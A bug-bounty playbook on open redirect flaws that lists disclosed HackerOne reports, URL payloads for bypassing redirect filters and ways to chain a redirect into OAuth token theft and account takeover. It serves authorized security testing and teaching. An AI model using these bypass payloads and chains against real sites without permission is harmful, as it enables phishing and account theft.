# Real-World Playbook — Open Redirect

**Class:** `open-redirect` · **Coverage-matrix tier:** 1 · **Hunter2:** vuln_scanner.sh · /client-side · **Skill:** web2-vuln-classes
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Why it pays (real bounty signal)
Top disclosed Open Redirect reports peak at **$3,000**. Rewarded across: GitLab, Internet Bug Bounty, Keybase, LY Corporation, Ruby on Rails, Shopify, Showmax, Slack.

## How real hackers found it — top disclosed reports
*(title = the actual technique; open the report for the full PoC)*

- **Reflected XSS via Unvalidated / Open Redirect in uber.com** — Uber, $3,000 · 10👍 · [125791](https://hackerone.com/reports/125791)
- **open redirect in rfc6749** — Internet Bug Bounty, $3,000 · 6👍 · [26962](https://hackerone.com/reports/26962)
- **Open Redirect Vulnerability in Action Pack** — Internet Bug Bounty, $2,400 · 43👍 · [1865991](https://hackerone.com/reports/1865991)
- **XSS and Open Redirect on MoPub Login** — X / xAI, $1,540 · 247👍 · [683298](https://hackerone.com/reports/683298)
- **Open Redirect leak of authenticity_token lead to full account take over.** — X / xAI, $1,400 · 7👍 · [49759](https://hackerone.com/reports/49759)
- **Open redirect at https://inventory.upserve.com/http://google.com/** — Upserve, $1,200 · 178👍 · [469803](https://hackerone.com/reports/469803)
- **[dev.twitter.com] XSS and Open Redirect** — X / xAI, $1,120 · 74👍 · [260744](https://hackerone.com/reports/260744)
- **[dev.twitter.com] XSS and Open Redirect Protection Bypass** — X / xAI, $1,120 · 45👍 · [330008](https://hackerone.com/reports/330008)
- **page.line.me Open Redirect Leading to OAuth Authorization Code Exposure and Access Token Compromise** — LY Corporation, $1,000 · 43👍 · [3423013](https://hackerone.com/reports/3423013)
- **Instant open redirect on Live preview WEB Ide opening** — GitLab, $1,000 · 20👍 · [437142](https://hackerone.com/reports/437142)
- **Open Redirect (6.0.0 \< rails \< 6.0.3.2)** — Ruby on Rails, $1,000 · 19👍 · [904059](https://hackerone.com/reports/904059)
- **Trick make all fixed open redirect links vulnerable again** — Slack, $1,000 · 4👍 · [104087](https://hackerone.com/reports/104087)
- **Chained open redirects and use of Ideographic Full Stop defeat Twitter's  approach to blocking links** — X / xAI, $560 · 70👍 · [1032610](https://hackerone.com/reports/1032610)
- **open redirect sends authenticity_token to any website or (ip address)** — X / xAI, $560 · 1👍 · [50752](https://hackerone.com/reports/50752)
- **Open Redirect in secure.showmax.com** — Showmax, $550 · 225👍 · [749338](https://hackerone.com/reports/749338)
- **[keybase.io] Open Redirect** — Keybase, $500 · 40👍 · [87027](https://hackerone.com/reports/87027)
- **CBC "cut and paste" attack may cause Open Redirect(even XSS)** — Uber, $500 · 22👍 · [126203](https://hackerone.com/reports/126203)
- **Open redirection in OAuth** — Shopify, $500 · 14👍 · [55525](https://hackerone.com/reports/55525)

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
https://example.com/redirect?url=https://userpreferredsite.com
```
```
var redirectTo = "http://trusted.com";
window.location = redirectTo;
```
```
?checkout_url={payload}
?continue={payload}
?dest={payload}
?destination={payload}
?go={payload}
?image_url={payload}
?next={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
?return_path={payload}
?return_to={payload}
?return={payload}
?returnTo={payload}
?rurl={payload}
?target={payload}
?url={payload}
?view={payload}
/{payload}
/redirect/{payload}
```
```
    www.whitelisted.com.evil.com redirect to evil.com
```
```
    java%0d%0ascript%0d%0a:alert(0)
```
```
    //google.com
    ////google.com
```
```
    https:google.com
```
```
    \/\/google.com/
    /\/google.com/
```
```
    /?redir=google。com
    //google%E3%80%82com
```
```
    //google%00.com
```
```
    ?next=whitelisted.com&next=google.com
```
```
    //<user>:<password>@<host>:<port>/<url-path>
    http://www.theirsite.com@yoursite.com/
```
```
    http://www.yoursite.com/http://www.theirsite.com/
    http://www.yoursite.com/folder/www.folder.com
```
```
    http://www.yoursite.com?http://www.theirsite.com/
    http://www.yoursite.com?folder/www.folder.com
```
```
    https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
    http://a.com／X.b.com
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From AllAboutBugBounty
#### Open Redirect

#### Introduction
Open redirection vulnerabilities arise when an application incorporates user-controllable data into the target of a redirection in an unsafe way. An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain

#### Where to find
- Sometimes it can be found in login / register / logout pages
- Checking the javascript source code

#### How to exploit
1. Try change the domain
```
/?redir=evil.com
```

2. Using a whitelisted domain or keyword
```
/?redir=target.com.evil.com
```

3. Using `//` to bypass `http` blacklisted keyword
```
/?redir=//evil.com
```

4. Using `https:` to bypass `//` blacklisted keyword
```
/?redir=https:evil.com
```

5. Using `\\` to bypass `//` blacklisted keyword
```
/?redir=\\evil.com
```

6. Using `\/\/` to bypass `//` blacklisted keyword
```
/?redir=\/\/evil.com/
/?redir=/\/evil.com/
```

7. Using `%E3%80%82` to bypass `.` blacklisted character
```
/?redir=evil。com
/?redir=evil%E3%80%82com
```

8. Using null byte `%00` to bypass blacklist filter
```
/?redir=//evil%00.com
```

9. Using parameter pollution
```
/?next=target.com&next=evil.com
```

10. Using `@` or `%40` character, browser will redirect to anything after the `@`
```
/?redir=target.com@evil.com
/?redir=target.com%40evil.com
```

11. Creating folder as their domain
```
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
```

12.  Using `?` characted, browser will translate it to `/?`

*(truncated — open the source link for the full method)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### Open Redirect



#### Open redirect

##### Redirect to localhost or arbitrary domains

- If the app “allows only internal/whitelisted hosts”, try alternative host notations to hit loopback or internal ranges via the redirect target:
  - IPv4 loopback variants: 127.0.0.1, 127.1, 2130706433 (decimal), 0x7f000001 (hex), 017700000001 (octal)
  - IPv6 loopback variants: [::1], [0:0:0:0:0:0:0:1], [::ffff:127.0.0.1]
  - Trailing dot and casing: localhost., LOCALHOST, 127.0.0.1.
  - Wildcard DNS that resolves to loopback: lvh.me, sslip.io (e.g., 127.0.0.1.sslip.io), traefik.me, localtest.me. These are useful when only “subdomains of X” are allowed but host resolution still points to 127.0.0.1.
- Network-path references often bypass naive validators that prepend a scheme or only check prefixes:<sup>[[5]](#references)</sup>
  - //attacker.tld → interpreted as scheme-relative and navigates off-site with the current scheme.
- Userinfo tricks defeat contains/startswith checks against trusted hosts:<sup>[[4]](#references)</sup>
  - https://trusted.tld@attacker.tld/ → browser navigates to attacker.tld but simple string checks “see” trusted.tld.
- Backslash parsing confusion between frameworks/browsers:
  - https://trusted.tld\@attacker.tld → some backends treat “\” as a path char and pass validation; browsers normalize to “/” and interpret trusted.tld as userinfo, sending users to attacker.tld. This also appears in Node/PHP URL-parser mismatches.
- Userinfo/parser differential payloads are still producing real bugs in 2024+:
  - `https://trusted.example[@attacker.example` or `https://trusted.example%5B@attacker.example` can confuse server-side URL parsers/host validators while browsers still navigate to `attacker.example`. This is especially interesting in frameworks that validate `host` from a parsed object and later redirect with the original string.<sup>[[1]](#references)</sup>


*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- Open redirect → **OAuth token/code theft** → ATO
- Redirect → phishing on trusted domain
- Chain with SSRF filter bypass

## Hunter2 wiring
- **Run:** `vuln_scanner.sh · /client-side`
- **Skill:** `web2-vuln-classes`
- **Coverage-matrix tier:** 1 (Tier 0 = test first)

## What gets this rejected (kill before you write)
*(from the toolkit NEVER-SUBMIT list — match one of these with no chain → KILL IT)*
- Open redirect alone (no OAuth token / auth-code theft, no ATO chain) → informational
- Redirect to an arbitrary domain with nothing sensitive in the URL (no token / `authenticity_token` leaked)
- Tabnabbing, or a redirect used only as a phishing pretext with no credential-capture PoC
- Redirect that only works within your own session
- "`//evil.com` works" with no demonstrated downstream impact

**Conditionally valid (only WITH a chain):** an open redirect on an OAuth `redirect_uri` — or a page that carries an auth code / `authenticity_token` / session token in the URL — that leaks it to the attacker → ATO (Critical); or an SSRF filter-bypass chain.
